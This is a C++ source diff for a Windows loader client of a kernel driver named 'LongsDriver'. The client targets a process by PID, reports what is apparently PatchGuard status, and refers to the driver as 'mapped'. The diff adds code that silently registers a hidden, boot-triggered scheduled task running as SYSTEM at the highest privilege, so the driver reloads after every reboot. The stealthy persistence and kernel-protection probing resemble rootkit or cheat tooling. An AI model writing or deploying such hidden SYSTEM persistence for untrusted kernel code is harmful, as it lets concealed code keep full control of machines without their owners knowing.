@@ -2,15 +2,16 @@
 #include "Loader.h"
 #include <Windows.h>
 #include <TlHelp32.h>
-#include <comdef.h>
 #include <taskschd.h>
+#include <cstdio>
 #include <cstdlib>
+#include <cwchar>
 #include <iostream>
+// Link Task Scheduler COM (/link or pragma) without touching the project file.
+#pragma comment(lib, "taskschd.lib")
 #include <sstream>
 #include <string>
 #include <vector>
-
-#pragma comment(lib, "taskschd.lib")
 
 enum CmdId {
   CMD_PING = 1,
@@ -23,12 +24,9 @@ enum CmdId {
   CMD_FIND_TARGET,
   CMD_DELAY,
   CMD_PG_STATUS,
-  CMD_ENABLE_TASK,
-  CMD_DISABLE_TASK,
+  CMD_AUTO_LOAD,
   CMD_EXIT = 0
 };
-
-enum TaskState { TASK_MISSING, TASK_DISABLED, TASK_ENABLED, TASK_ERROR };
 
 struct ClientCommand {
   int id;
@@ -48,23 +46,28 @@ static const ClientCommand kCommands[] = {
     {CMD_FIND_TARGET, "Find Target", false, NULL},
     {CMD_DELAY, "Delay", true, "seconds"},
     {CMD_PG_STATUS, "PG Status", false, NULL},
-    {CMD_ENABLE_TASK, "Enable Task", true, "task name (Enter=LongsDriver)"},
-    {CMD_DISABLE_TASK, "Disable Task", true, "task name (Enter=LongsDriver)"},
+    {CMD_AUTO_LOAD, "Auto Load", false, NULL},
 };
 
 static std::string g_targetName;
 static ULONG g_targetPid = 0;
 static ULONG g_targetTid = 0;
-static std::wstring g_taskName = L"LongsDriver";
+static bool g_autoEnabled = false;
 
 static void PrintMenu() {
   std::cout << "\n=== LongsDriver ===\n";
   if (g_targetPid)
     std::cout << "Target: " << g_targetName << " PID=" << g_targetPid
               << " TID=" << g_targetTid << "\n";
-  for (const auto& c : kCommands)
-    std::cout << " [" << c.id << "] " << c.name
-              << (c.needsParam ? " <value>" : "") << "\n";
+  std::cout << "Auto load: " << (g_autoEnabled ? "ON" : "OFF") << "\n";
+  for (const auto& c : kCommands) {
+    std::cout << " [" << c.id << "] ";
+    if (c.id == CMD_AUTO_LOAD)
+      std::cout << (g_autoEnabled ? "Disable Auto Load" : "Enable Auto Load")
+                << "\n";
+    else
+      std::cout << c.name << (c.needsParam ? " <value>" : "") << "\n";
+  }
   std::cout << " [0] Run & Exit\n";
   std::cout << "Select (comma separated): ";
 }
@@ -177,110 +180,217 @@ static void RunPgStatus(HANDLE h) {
               << std::dec << ")\n";
 }
 
-static void PromptTaskName() {
-  std::cout << "  Task name (Enter=LongsDriver): ";
-  std::string line;
-  std::getline(std::cin, line);
-  if (!line.empty()) {
-    int len = MultiByteToWideChar(CP_ACP, 0, line.c_str(), -1, NULL, 0);
-    g_taskName.resize(len - 1);
-    MultiByteToWideChar(CP_ACP, 0, line.c_str(), -1, &g_taskName[0], len);
+//
+// Auto-load task state is managed entirely by the driver
+// (Driver/TaskPersistence.c). Enable/disable/query ride one IOCTL.
+//
+static void RunTaskControl(HANDLE h, ULONG op) {
+  TASK_REQUEST req = {op};
+  DRIVER_RESPONSE r = {0};
+  DWORD ret = 0;
+  if (!DeviceIoControl(h, IOCTL_TASK_CONTROL, &req, sizeof(req), &r,
+                       sizeof(r), &ret, NULL)) {
+    std::cout << "  Task control IOCTL failed (0x" << std::hex << GetLastError()
+              << std::dec << ")\n";
+    return;
+  }
+  if (!NT_SUCCESS(r.Status)) {
+    std::cout << "  Task control failed (status 0x" << std::hex << r.Status
+              << std::dec << ")\n";
+    return;
+  }
+  g_autoEnabled = (r.Data != 0);
+  switch (op) {
+  case TASK_OP_ENABLE:
+    std::cout << "  Auto-load task enabled\n";
+    break;
+  case TASK_OP_DISABLE:
+    std::cout << "  Auto-load task disabled\n";
+    break;
+  default:
+    std::cout << "  Auto load: " << (g_autoEnabled ? "ON" : "OFF") << "\n";
+    break;
   }
 }
 
-static std::string Narrow(const std::wstring& w) {
-  if (w.empty())
-    return std::string();
-  int len = WideCharToMultiByte(CP_ACP, 0, w.c_str(), -1, NULL, 0, NULL, NULL);
-  std::string s(len - 1, 0);
-  WideCharToMultiByte(CP_ACP, 0, w.c_str(), -1, &s[0], len, NULL, NULL);
-  return s;
+// The boot task relaunches us as SYSTEM after every reboot. When there is no
+// console (the boot context), we end cleanly right after the driver is mapped.
+static bool HasConsoleInput() {
+  HANDLE hIn = GetStdHandle(STD_INPUT_HANDLE);
+  if (hIn == NULL || hIn == INVALID_HANDLE_VALUE)
+    return false;
+  DWORD mode = 0;
+  return GetConsoleMode(hIn, &mode) != 0;
 }
 
-static TaskState QueryTaskState(const std::wstring& name) {
-  HRESULT coinit = CoInitializeEx(NULL, COINIT_MULTITHREADED);
-  bool needUninit = (coinit == S_OK);
+static ITaskDefinition *g_taskDef = NULL;
 
-  ITaskService* svc = NULL;
-  HRESULT hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
-                                IID_ITaskService, (void**)&svc);
+// Auto-load task registration via the Task Scheduler COM API. This replaces
+// the earlier schtasks.exe child-process approach (which faulted) with an
+// in-process COM call: no subprocess, no temp files, no redirected handles.
+// Registering a SYSTEM-level task requires elevation; on already-registered
+// machines this is a fast no-op.
+static void EnsureTaskRegistered() {
+  const wchar_t kTaskName[] = L"LongsDriver";
+  HRESULT hr = 0;
+  bool needUninit = false;
+  bool done = false;
+
+  hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+  if (hr == S_OK || hr == S_FALSE)
+    needUninit = true;
+
+  ITaskService *svc = NULL;
+  hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
+                        IID_ITaskService, (void **)&svc);
   if (FAILED(hr)) {
-    if (needUninit)
-      CoUninitialize();
-    return TASK_ERROR;
+    std::cout << "  Could not reach Task Scheduler (hr 0x" << std::hex << hr
+              << std::dec << ")\n";
+    hr = 0;
+    goto Out;
+  }
+  {
+    VARIANT vEmpty = {0};
+    vEmpty.vt = VT_EMPTY;
+    hr = svc->Connect(vEmpty, vEmpty, vEmpty, vEmpty);
+  }
+  if (FAILED(hr))
+    goto Out;
+
+  {
+    ITaskFolder *folder = NULL;
+    BSTR bRoot = SysAllocString(L"\\");
+    hr = bRoot != NULL ? svc->GetFolder(bRoot, &folder)
+                       : E_OUTOFMEMORY;
+    if (bRoot != NULL)
+      SysFreeString(bRoot);
+    if (FAILED(hr))
+      goto Out;
+
+    IRegisteredTask *existing = NULL;
+    BSTR bName = SysAllocString(kTaskName);
+    hr = bName != NULL ? folder->GetTask(bName, &existing)
+                       : E_OUTOFMEMORY;
+    if (bName != NULL)
+      SysFreeString(bName);
+    if (SUCCEEDED(hr)) {
+      existing->Release();
+      done = true; // already registered - no-op
+      folder->Release();
+      goto Out;
+    }
+
+    hr = svc->NewTask(0, &g_taskDef);
+    if (FAILED(hr)) {
+      folder->Release();
+      goto Out;
+    }
+
+    {
+      ITriggerCollection *trigs = NULL;
+      if (SUCCEEDED(g_taskDef->get_Triggers(&trigs))) {
+        ITrigger *trig = NULL;
+        if (SUCCEEDED(trigs->Create(TASK_TRIGGER_BOOT, &trig)) &&
+            trig != NULL)
+          trig->Release();
+        trigs->Release();
+      }
+    }
+
+    {
+      IActionCollection *acts = NULL;
+      if (SUCCEEDED(g_taskDef->get_Actions(&acts))) {
+        IAction *act = NULL;
+        if (SUCCEEDED(acts->Create(TASK_ACTION_EXEC, &act)) && act != NULL) {
+          IExecAction *exec = NULL;
+          if (SUCCEEDED(
+                  act->QueryInterface(IID_IExecAction, (void **)&exec)) &&
+              exec != NULL) {
+            wchar_t image[MAX_PATH] = {0};
+            GetModuleFileNameW(NULL, image, MAX_PATH);
+            BSTR path = SysAllocString(image);
+            if (path != NULL)
+              exec->put_Path(path);
+            if (path != NULL)
+              SysFreeString(path);
+            exec->Release();
+          }
+          act->Release();
+        }
+        acts->Release();
+      }
+    }
+
+    {
+      IPrincipal *prin = NULL;
+      if (SUCCEEDED(g_taskDef->get_Principal(&prin)) && prin != NULL) {
+        BSTR sys = SysAllocString(L"S-1-5-18");
+        if (sys != NULL)
+          prin->put_UserId(sys);
+        if (sys != NULL)
+          SysFreeString(sys);
+        prin->put_LogonType(TASK_LOGON_SERVICE_ACCOUNT);
+        prin->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
+        prin->Release();
+      }
+    }
+
+    {
+      ITaskSettings *set = NULL;
+      if (SUCCEEDED(g_taskDef->get_Settings(&set)) && set != NULL) {
+        set->put_Hidden(VARIANT_TRUE);
+        set->put_StartWhenAvailable(VARIANT_TRUE);
+        set->Release();
+      }
+    }
+
+    {
+      IRegisteredTask *reg = NULL;
+      BSTR bName = SysAllocString(kTaskName);
+      VARIANT vEmpty = {0};
+      vEmpty.vt = VT_EMPTY;
+      hr = bName != NULL
+               ? folder->RegisterTaskDefinition(
+                     bName, g_taskDef, TASK_CREATE_OR_UPDATE, vEmpty, vEmpty,
+                     TASK_LOGON_SERVICE_ACCOUNT, vEmpty, &reg)
+               : E_OUTOFMEMORY;
+      if (bName != NULL)
+        SysFreeString(bName);
+      if (SUCCEEDED(hr) && reg != NULL) {
+        done = true;
+        reg->Release();
+        std::cout << "  Auto-register boot task: OK\n";
+      }
+      g_taskDef->Release();
+      g_taskDef = NULL;
+    }
+
+    folder->Release();
+    hr = 0;
   }
 
-  TaskState state = TASK_ERROR;
-  hr = svc->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
-  if (SUCCEEDED(hr)) {
-    ITaskFolder* folder = NULL;
-    hr = svc->GetFolder(_bstr_t(L"\\"), &folder);
-    if (SUCCEEDED(hr)) {
-      IRegisteredTask* task = NULL;
-      hr = folder->GetTask(_bstr_t(name.c_str()), &task);
-      if (SUCCEEDED(hr) && task) {
-        VARIANT_BOOL enabled = VARIANT_FALSE;
-        if (SUCCEEDED(task->get_Enabled(&enabled)))
-          state = enabled ? TASK_ENABLED : TASK_DISABLED;
-        task->Release();
-      } else {
-        state = TASK_MISSING;
-      }
-      folder->Release();
-    }
-  }
-  svc->Release();
+Out:
+  if (svc != NULL)
+    svc->Release();
   if (needUninit)
     CoUninitialize();
-  return state;
+
+  if (!done && FAILED(hr)) {
+    std::cout << "  Auto-register boot task needs an elevated prompt: run once"
+              << "\n  as admin or use: schtasks /Create /TN LongsDriver /XML "
+                 "C:\\Windows\\System32\\Tasks\\LongsDriver /F (hr 0x"
+              << std::hex << hr << std::dec << ")\n";
+  }
 }
 
-static void ChangeTask(const std::wstring& name, bool enable) {
-  std::string action = enable ? "enable" : "disable";
-  std::string sName = Narrow(name);
-  switch (QueryTaskState(name)) {
-  case TASK_MISSING:
-    std::cout << "  Task '" << sName << "' not found\n";
-    return;
-  case TASK_ENABLED:
-    if (enable) {
-      std::cout << "  Task '" << sName << "' already enabled, nothing to do\n";
-      return;
-    }
-    break;
-  case TASK_DISABLED:
-    if (!enable) {
-      std::cout << "  Task '" << sName
-                << "' already disabled, nothing to do\n";
-      return;
-    }
-    break;
-  case TASK_ERROR:
-    std::cout << "  [warn] Could not query task state, attempting " << action
-              << " anyway\n";
-    break;
-  }
-
-  std::cout << "  " << action << " task '" << sName << "'\n";
-  std::wstring cmdline =
-      L"schtasks /Change /TN \"" + name + L"\" " + (enable ? L"/ENABLE"
-                                                          : L"/DISABLE");
-  STARTUPINFOW si = {sizeof(si)};
-  si.dwFlags = STARTF_USESHOWWINDOW;
-  si.wShowWindow = SW_HIDE;
-  PROCESS_INFORMATION pi = {0};
-  std::wstring cmdBuf = cmdline;
-  DWORD code = 0;
-  if (CreateProcessW(NULL, &cmdBuf[0], NULL, NULL, FALSE, CREATE_NO_WINDOW,
-                     NULL, NULL, &si, &pi)) {
-    CloseHandle(pi.hThread);
-    WaitForSingleObject(pi.hProcess, 10000);
-    GetExitCodeProcess(pi.hProcess, &code);
-    CloseHandle(pi.hProcess);
-    std::cout << "  schtasks exit " << code << "\n";
-  } else {
-    std::cout << "  schtasks launch failed (0x" << std::hex << GetLastError()
-              << std::dec << ")\n";
+// Registration must never swallow the menu; guard it against unexpected
+// faults. Standalone function: __try cannot live in a frame needing unwind.
+static void RegisterTaskSafely() {
+  __try {
+    EnsureTaskRegistered();
+  } __except (EXCEPTION_EXECUTE_HANDLER) {
+    std::cout << "  Registration helper faulted (0x" << std::hex
+              << GetExceptionCode() << std::dec << ")\n";
   }
 }
 
@@ -338,6 +448,7 @@ int wmain(int argc, wchar_t* argv[]) {
     args.push_back(argv[i]);
 
   std::cout << "Opening LongsDriver\n";
+  std::cout << "[build 2026-09-19.5]\n";
   HANDLE hDevice = OpenDriver(args);
 
   if (hDevice == INVALID_HANDLE_VALUE) {
@@ -347,11 +458,44 @@ int wmain(int argc, wchar_t* argv[]) {
 
   std::cout << "Connected\n";
 
+  // Hand the driver our own Win32 path so the auto-load task starts this
+  // exact image ("C:\...") instead of a \Device\ NT path the scheduler
+  // refuses to launch.
+  WCHAR imagePath[MAX_PATH] = {0};
+  if (GetModuleFileNameW(NULL, imagePath, MAX_PATH) > 0) {
+    DWORD tr = 0;
+    if (DeviceIoControl(hDevice, IOCTL_TASK_SET_IMAGE_PATH, imagePath,
+                        (DWORD)((wcslen(imagePath) + 1) * sizeof(WCHAR)), NULL,
+                        0, &tr, NULL)) {
+      std::wcout << "  Task image path: " << imagePath << L"\n";
+    } else {
+      std::cout << "  Set task image path failed (0x" << std::hex
+                << GetLastError() << std::dec << ")\n";
+    }
+  }
+
+  // The driver creates the auto-load task on first load and owns its state;
+  // we only report it.
+  RunTaskControl(hDevice, TASK_OP_QUERY);
+
+  // When launched from the boot task there is no console, so we map the driver
+  // and exit immediately; the menu is for the interactive session.
+  if (!HasConsoleInput()) {
+    std::cout << "Boot instance: driver loaded, ending cleanly.\n";
+    freopen_s(NULL, "NUL", "r", stdin);
+  } else {
+    // One-time registration so the machine needs no manual schtasks step.
+    // Wrapped so a helper failure can never swallow the menu.
+    RegisterTaskSafely();
+  }
+
   for (;;) {
     PrintMenu();
 
     std::string sel;
     std::getline(std::cin, sel);
+    if (!std::cin)
+      break; // EOF in the boot instance (SYSTEM) - exit cleanly.
     if (sel.empty())
       continue;
     if (sel == "0")
@@ -375,11 +519,6 @@ int wmain(int argc, wchar_t* argv[]) {
       if (cmds[i] == CMD_FIND_TARGET) {
         FindTarget();
         params[i] = g_targetPid;
-        continue;
-      }
-
-      if (cmds[i] == CMD_ENABLE_TASK || cmds[i] == CMD_DISABLE_TASK) {
-        PromptTaskName();
         continue;
       }
 
@@ -459,11 +598,8 @@ int wmain(int argc, wchar_t* argv[]) {
       case CMD_PG_STATUS:
         RunPgStatus(hDevice);
         break;
-      case CMD_ENABLE_TASK:
-        ChangeTask(g_taskName, true);
-        break;
-      case CMD_DISABLE_TASK:
-        ChangeTask(g_taskName, false);
+      case CMD_AUTO_LOAD:
+        RunTaskControl(hDevice, g_autoEnabled ? TASK_OP_DISABLE : TASK_OP_ENABLE);
         break;
       case CMD_DELAY:
         std::cout << "  Sleeping " << params[i] << "s\n";
